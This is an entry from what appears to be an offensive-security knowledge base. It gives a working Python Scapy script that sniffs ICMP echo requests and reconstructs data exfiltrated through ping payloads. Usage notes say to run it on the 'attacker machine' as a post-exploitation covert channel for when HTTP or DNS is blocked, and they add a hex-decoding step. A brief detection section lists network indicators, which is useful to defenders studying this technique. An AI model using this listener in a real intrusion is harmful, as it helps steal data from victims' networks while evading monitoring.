---
type: code
language: Python3
verified: true
created_at: '2020-03-17T05:52:24.199179+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - exfiltration
  - icmp
  - sniffer
  - scapy
validated: true
---

# icmp-exfil-listener-scapy

## Code

```python3
#!/usr/bin/env python3
from scapy.all import *
import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <INTERFACE>")
    exit(0)
else:
    interface = sys.argv[1]
    print(f"Sniffing on {interface}")


def print_data(pkt):
    if (pkt.haslayer(ICMP)) and (pkt[ICMP].type == 8):
        data = pkt[ICMP].load[-4:].decode("utf-8")
        print(f"{data}", flush=True, end="")

sniff(iface = interface, prn=print_data)
```

## Description

This Python script uses the Scapy library to sniff ICMP echo request packets (type 8) on a specified network interface and extracts the last 4 bytes of each packet's load, decoding them as UTF-8 characters. It is designed to reconstruct exfiltrated data sent via ping payloads, printing chunks in real-time without additional formatting. Run with elevated privileges (sudo) to capture packets.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <INTERFACE> | Network interface to sniff on (e.g., eth0, wlan0) | eth0 |

No other variables; the script processes all qualifying packets dynamically.

## Usage

Save as icmp_listener.py and execute on the attacker machine before initiating exfiltration: sudo python3 icmp_listener.py eth0. It will continuously listen and print decoded chunks as pings arrive. Redirect output to a file (e.g., > received_data.txt) for later decoding from hex back to binary if needed (e.g., xxd -r -p received_data.txt > original_file).

This code is typically used in post-exploitation scenarios for stealthy data exfiltration over ICMP when HTTP/DNS is blocked.

## Detection

- Network monitoring for Scapy usage (process monitoring shows python3 with scapy import).
- High volumes of inbound ICMP echo requests with non-standard payloads.
- Anomalous Python processes sniffing interfaces without legitimate reason.
- Packet captures showing filtered ICMP traffic patterns.

## Related

- [[procedures/Exfiltrate-Data-Using-Ping]]
- [[tools/Scapy]]
